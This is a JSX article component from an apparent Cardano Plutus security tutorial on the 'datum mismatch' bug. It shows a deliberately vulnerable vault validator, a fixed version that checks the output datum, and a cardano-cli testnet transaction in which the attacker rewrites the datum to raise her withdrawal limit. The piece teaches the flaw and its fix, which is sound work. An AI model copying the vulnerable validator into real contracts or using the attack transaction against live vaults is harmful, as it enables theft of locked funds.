import CodeBlock from "@/components/layouts/CodeBlock";

export const articleMeta = {
    id: "datummismatch",
    title: "Datum Mismatch Exploit",
    subtitle: "A silent takeover where an attacker complies with the script's output rules, but maliciously overwrites the smart contract's state",
    date: "2025-02-25T13:00:00.000Z",
    readTime: "10 min read",
    tags: ["plutus", "cardano", "security", "exploit", "advanced"],
    author: {
        name: "Aman Kumar",
        avatar: "https://i.pravatar.cc/48?img=21",
    },
    plutusVersion: "V2",
    complexity: "Advanced",
    useCase: "Security",
};

export default function DatumMismatchArticle() {
    const haskellCode = `{-# LANGUAGE DataKinds           #-}
{-# LANGUAGE ImportQualifiedPost #-}
{-# LANGUAGE NoImplicitPrelude   #-}
{-# LANGUAGE OverloadedStrings   #-}
{-# LANGUAGE TemplateHaskell     #-}

module DatumMismatch where

import qualified Plutus.V2.Ledger.Api as PlutusV2
import           PlutusTx             (BuiltinData, compile, unstableMakeIsData)
import           PlutusTx.Prelude     (Bool, traceIfFalse, (&&), ($), (==))
import           Plutus.V1.Ledger.Value (valueOf)
import           Prelude              (IO)
import           Utilities            (wrapValidator, writeValidatorToFile)

---------------------------------------------------------------------------------------------------
----------------------------------- ON-CHAIN / VULNERABLE VALIDATOR -------------------------------

-- The datum tracks who currently owns the vault and how much they are allowed to withdraw.
data VaultDatum = VaultDatum
    { owner       :: PlutusV2.PubKeyHash 
    , withdrawLimit :: Integer 
    }
PlutusTx.unstableMakeIsData ''VaultDatum

-- ❌ VULNERABLE DESIGN ❌
-- This validator correctly forces a "continuing output" back to the script address if the user
-- only makes a partial withdrawal. But it forgets to check if the user tampered with the Datum!

{-# INLINABLE mkVulnerableVault #-}
mkVulnerableVault :: VaultDatum -> () -> PlutusV2.ScriptContext -> Bool
mkVulnerableVault dat () ctx = 
    traceIfFalse "Only owner can withdraw!" (PlutusV2.txSignedBy info (owner dat)) &&
    -- The script makes sure that the remaining ADA goes back to the script address.
    traceIfFalse "Script did not receive a continuing output!" hasContinuingOutput
  where
    info :: PlutusV2.TxInfo
    info = PlutusV2.scriptContextTxInfo ctx

    -- It finds an output going back to its own address. But it doesn't look inside it!
    hasContinuingOutput :: Bool
    hasContinuingOutput =
        let ownOutputs = [ o | o <- PlutusV2.txInfoOutputs info
                             , PlutusV2.txOutAddress o 
                               == PlutusV2.txOutAddress (PlutusV2.txInInfoResolved (head (PlutusV2.scriptContextTxInfoInputs info))) ]
        in length ownOutputs == 1


---------------------------------------------------------------------------------------------------
----------------------------------- THE FIX: EXPLICIT DATUM EQUALITY ------------------------------

-- ✅ SECURE DESIGN ✅
-- The script must aggressively audit not just the destination address of the continuing output,
-- but the exact cryptographic state (Datum) attached to it.

{-# INLINABLE mkSecureVault #-}
mkSecureVault :: VaultDatum -> () -> PlutusV2.ScriptContext -> Bool
mkSecureVault dat () ctx = 
    traceIfFalse "Only owner can withdraw!" (PlutusV2.txSignedBy info (owner dat)) &&
    -- The output must exist AND must carry the exact same VaultDatum as the input.
    traceIfFalse "Continuing output state was maliciously altered!" validStatePropagation
  where
    info :: PlutusV2.TxInfo
    info = PlutusV2.scriptContextTxInfo ctx

    validStatePropagation :: Bool
    validStatePropagation =
        let 
            ownOutputs = [ o | o <- PlutusV2.txInfoOutputs info
                             , PlutusV2.txOutAddress o 
                               == PlutusV2.txOutAddress (PlutusV2.txInInfoResolved (head (PlutusV2.scriptContextTxInfoInputs info))) ]
        in
            case ownOutputs of
                [out] -> 
                    -- We must extract the inline datum from the output and verify it mathematically matches the input datum!
                    case PlutusV2.txOutDatum out of
                        PlutusV2.OutputDatum (PlutusV2.Datum d) -> 
                            PlutusTx.unsafeFromBuiltinData d == dat
                        _ -> False -- Fail if there is no inline datum or if it's a datum hash
                _ -> False

    length :: [a] -> Integer
    length []     = 0
    length (_:xs) = 1 + length xs

{-# INLINABLE wrappedVulnVal #-}
wrappedVulnVal :: BuiltinData -> BuiltinData -> BuiltinData -> ()
wrappedVulnVal = wrapValidator mkVulnerableVault

validator :: PlutusV2.Validator
validator =
  PlutusV2.mkValidatorScript
    $$(PlutusTx.compile [|| wrappedVulnVal ||])
`;

    const bashCommands = `# Scenario: Alice locks 10,000 ADA into the Vault.
# The Datum states that Alice is the owner, and her withdrawal limit is 1,000 ADA per tx.

# Alice decides to withdraw her 1,000 ADA. She constructs the transaction correctly,
# sending 1,000 ADA to herself, and 9,000 ADA back to the script address.
# BUT, Alice is malicious. She decides to slightly alter the Datum attached to the 9,000 ADA output.

# -------------------------------------------------------------------------
# THE DATUM MISMATCH EXPLOIT
# Notice the --tx-out-inline-datum-value parameter. Alice changes her withdrawal limit
# from 1,000 ADA (1000000000 Lovelace) to 9,000 ADA (9000000000 Lovelace).

$ cardano-cli conway transaction build \\
  --tx-in f29c7d41ef993a40...#0 \\
  --tx-in-script-file vulnerable_vault.plutus \\
  --tx-in-inline-datum-present \\
  --tx-in-redeemer-value '{"constructor":0,"fields":[]}' \\
  \\
  # The payout output (Alice takes her legal 1,000 ADA)
  --tx-out $(cat alice.addr)+1000000000 \\
  \\
  # The continuing output (Alice sends 9,000 ADA back to the script to satisfy it)
  # ⚠️ THE EXPLOIT: Alice changes the integer limit in the datum to 9,000!
  --tx-out $(cat vulnerable_vault.addr)+9000000000 \\
  --tx-out-inline-datum-value '{"constructor":0,"fields":[{"bytes":"alice_hash..."},{"int":9000000000}]}' \\
  \\
  --required-signer-hash alice_hash_a8b9... \\
  --change-address $(cat alice.addr) \\
  --tx-in-collateral d83b72c9...#0 \\
  --testnet-magic 2 \\
  --out-file tx-attack.raw

$ cardano-cli conway transaction sign --tx-body-file tx-attack.raw --signing-key-file alice.skey --testnet-magic 2 --out-file tx-attack.signed
$ cardano-cli conway transaction submit --tx-file tx-attack.signed

# Result: 
# The Vulnerable script checks: "Did Alice sign this?" -> True.
# The Vulnerable script checks: "Did the script get an output?" -> True.
# Transaction succeeds.
# 
# Now, Alice physically owns the vault. She immediately submits a second transaction 
# legally withdrawing the remaining 9,000 ADA all at once, bypassing the original contract constraints.
`;

    return (
        <div className="article-content">
            <h2 id="introduction">Introduction</h2>

            <p>
                In Cardano, "State" isn't stored in a centralized database; it lives directly on UTxOs as a <strong>Datum</strong>. When updating state (e.g., tweaking an AMM pool or vesting schedule), the contract forces a "Continuing Output" to carry the new data.
            </p>

            <p>
                A <strong>Datum Mismatch</strong> bug happens when an otherwise solid contract verifies that tokens return to the script, but forgets to check the attached Datum. An attacker can just slip in corrupted data to hijack the contract's future.
            </p>

            <CodeBlock
                code={haskellCode}
                language="haskell"
                filename="DatumMismatch.hs"
            />
            <br />

            <h2 id="explanation">The Vulnerability Explained</h2>

            <h3>The Trojan Horse</h3>

            <p className="pexplaination">
                In the vulnerable <code>hasContinuingOutput</code> logic, the script filters outputs to find one matching its own <code>Address</code>. If it finds one, it blindly returns <code>True</code>.
            </p>

            <p className="pexplaination pt-2">
                It's like a bank guard ensuring you put an envelope into the safe, without checking if it contains real cash or Monopoly money.
            </p>

            <p className="pexplaination pt-2">
                The attacker beats the <i>location</i> check but hijacks the <i>state</i>. Here, Alice bumps her withdrawal limit. In a DEX context, an attacker might overwrite the <code>ownerPkh</code> of the liquidity pool to steal the reserves.
            </p>

            <h3>The Fix: Deep State Inspection</h3>

            <CodeBlock
                code={`case PlutusV2.txOutDatum out of
    PlutusV2.OutputDatum (PlutusV2.Datum d) -> 
        PlutusTx.unsafeFromBuiltinData d == dat`}
                language="haskell"
                filename="Enforcing Datum Integrity"
            />

            <p className="pexplaination pt-2">
                The fix: explicitly audit the output payload. The secure validator unpacks the <code>txOutDatum</code> and enforces that it exactly matches the input <code>dat</code> (or a strictly calculated mutation). Now, tampered datums fail the equality check immediately.
            </p>

            <br />

            <h2 id="execution">The Attacker's CLI Lifecycle</h2>

            <p className="pexplaination">
                This exploit is trivial to execute via CLI without touching Haskell. Just alter the JSON Datum in the <code>--tx-out-inline-datum-value</code> flag. As long as the type structure is valid, the script happily swallows the poisoned data.
            </p>

            <CodeBlock
                code={bashCommands}
                language="bash"
                filename="The State Hijacking Exploit"
            />

        </div>
    );
}
